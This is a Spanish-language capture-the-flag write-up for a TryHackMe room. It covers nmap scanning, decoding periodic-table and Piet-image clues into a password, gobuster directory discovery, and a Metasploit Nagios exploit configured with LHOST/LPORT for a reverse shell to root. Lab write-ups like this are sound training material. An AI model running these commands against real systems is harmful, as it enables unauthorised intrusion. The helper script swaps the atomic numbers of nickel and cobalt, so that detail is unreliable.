Bievenidos a otra sala en tryhackme. Otra sala de dificultad facil, en la cual usaremos nmap para escanear puertos abiertos y obtener informacion. Descubriremos mensajes ocultos mediante textos e imagenes con ayuda de un script y herramientas online. Enumeraremos directorios ocultos con gobuster, y nos logearemos dentro de una plataforma con versiones no actuailizadas para luego utilizar metasploit y adentrarnos en el sistema como usuario raiz root.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (1.4s latency).
Scanned at 2023-07-02 04:44:31 EDT for 47s
Not shown: 60914 closed ports, 4615 filtered ports
Reason: 60914 resets and 4615 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp       syn-ack ttl 63 Postfix smtpd
80/tcp   open  http       syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
389/tcp  open  ldap       syn-ack ttl 63 OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
5667/tcp open  tcpwrapped syn-ack ttl 63
Service Info: Host:  ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap

```

Nuestro escaneo de nmap nos muestra 6 puertos abiertos. Navegamos primero al servidor web para ver que encontramos. Vemos un mensaje con elementos de la tabla periodica. Parece no tener sentido, pero tenemos que buscar cada numero de cada elemento en el orden en el que estan y podemos notar que ser forma un mensaje con formato DECIMAL. En este script puedes poner los elementos que desees saber su numero en la tabla periodica :

```python
Periodic_table = {
    "H": 1,
    "He": 2,
    "Li": 3,
    "Be": 4,
    "B": 5,
    "C": 6,
    "N": 7,
    "O": 8,
    "F": 9,
    "Ne": 10,
    "Na": 11,
    "Mg": 12,
    "Al": 13,
    "Si": 14,
    "P": 15,
    "S": 16,
    "Cl": 17,
    "Ar": 18,
    "K": 19,
    "Ca": 20,
    "Sc": 21,
    "Ti": 22,
    "V": 23,
    "Cr": 24,
    "Mn": 25,
    "Fe": 26,
    "Ni": 27,
    "Co": 28,
    "Cu": 29,
    "Zn": 30,
    "Ga": 31,
    "Ge": 32,
    "As": 33,
    "Se": 34,
    "Br": 35,
    "Kr": 36,
    "Rb": 37,
    "Sr": 38,
    "Y": 39,
    "Zr": 40,
    "Nb": 41,
    "Mo": 42,
    "Tc": 43,
    "Ru": 44,
    "Rh": 45,
    "Pd": 46,
    "Ag": 47,
    "Cd": 48,
    "In": 49,
    "Sn": 50,
    "Sb": 51,
    "I": 53,
    "Te": 52,
    "Xe": 54,
    "Cs": 55,
    "Ba": 56,
    "La": 57,
    "Ce": 58,
    "Pr": 59,
    "Nd": 60,
    "Pm": 61,
    "Sm": 62,
    "Eu": 63,
    "Gd": 64,
    "Tb": 65,
    "Dy": 66,
    "Ho": 67,
    "Er": 68,
    "Tm": 69,
    "Yb": 70,
    "Lu": 71,
    "Hf": 72,
    "Ta": 73,
    "W": 74,
    "Re": 75,
    "Os": 76,
    "Ir": 77,
    "Pt": 78,
    "Au": 79,
    "Hg": 80,
    "Tl": 81,
    "Pb": 82,
    "Bi": 83,
    "Po": 84,
    "At": 85,
    "Rn": 86,
    "Fr": 87,
    "Ra": 88,
    "Ac": 89,
    "Th": 90,
    "Pa": 91,
    "U": 92,
    "Np": 93,
    "Pu": 94,
    "Am": 95,
    "Cm": 96,
    "Bk": 97,
    "Cf": 98,
    "Es": 99,
    "Fm": 100,
    "Md": 101,
    "No": 102,
    "Lr": 103
}

print("Bienvenido al convertidor de elementos de la tabla periódica")
print("🔬 Ingresa los elementos que desees averiguar su numero 🔬")
print("Por ejemplo: Ag-Hg-Po-Hg-Pt")

elements_input = input("Ingresa los elementos: ")
elements = elements_input.split("-")

number = []

for element in elements:
    if element in Periodic_table:
        number.append(str(Periodic_table[element]))
    else:
        number.append("Elemento desconocido")

number_chain = "-".join(number)
print("La cadena de números correspondiente es:", number_chain)
```

Nos quedaria de la siguiente manera : **47 80 73 51 84 46 80 78 103**

Al pasarlo por cyberchef desde formato decimal, nos muestra una imagen que nos transferiremos a nuestra maquina atacante `wget http://IPTARGET/PI3T.PNg`.
Una imagen Piet es un arte de forma visual que utiliza lenguaje de progamacion esoterico "Piet".

En esta parte tuve varios problemas para descifrar la imagen, pase la imagen de png a ppm y aun asi no pude resolverlo. Tenes que cargar la imagen en formato ppm a esta pagina https://www.bertnase.de/npiet/npiet-execute.php y se te descubre la password. Pero en mi caso no pude hacerlo y consulte a un write-up para descubrirla :**n3p3UQ&9BjLp4$7uhWdY**.

Ya tenemos una password pero no sabemos bien para que sirve.

# Intrusion & Priv.Escalation

Iniciamos una enumeracion a directorios ocultos con la herramienta `gobuster`

```bash
gobuster dir -u http://IPTARGET -w /Path/wordlist
```

Encontramos el directorio /nagios que nos pide unas credenciales para poder logearnos. Tenemos la password pero no sabemos cual es el user. Iniciamos un busqueda por internet sobre esta plataforma nagios tiene por defecto algun tipo de credenciales.

En la busqueda encontramos este fragmento : `The default user ID used to log in to the PurePower Integrated Manager Nagios Core web interface is **nagiosadmin and the password is PASSW0RD (with a zero)**`

Usaremos la password que encontramos anteriormente, ya que la default no va a funcionar.
Una vez ingresada a la plataforma, ya tenemos la version y nosotros como atacantes podemos buscar alguna vulnerabilidad, si es que existe, para poder explotar el servidor web.

En esta sala, voy a utilizar metasploit para hacerlo de una forma mas simple y automatica.
Iniciaremos metasploit y buscaremos la vulnerabilidad con la version que acabamos de encontrar.

```bash
msfconsole
search nagios
```

Una vez encontrado el exploit, que funcione correctamente, procedemos a seleccionarlo y configurar los patrones antes de ejecutarlo de la siguiente forma:

```bash
use exploit/linux/http/nagios_xi_plugins_check_p...

show options # Vemos las opciones que tendremos que modificar

set rhosts   --> IPTARGET 
set password --> n3p3UQ&9BjLp4$7uhWdY
set LHOST    --> LocalHost/tun0
set LPORT    --> LocalPort

exploit
```

Una vez ejecutado, ya nos escalara privilegios automaticamente y seremos usuario raiz root.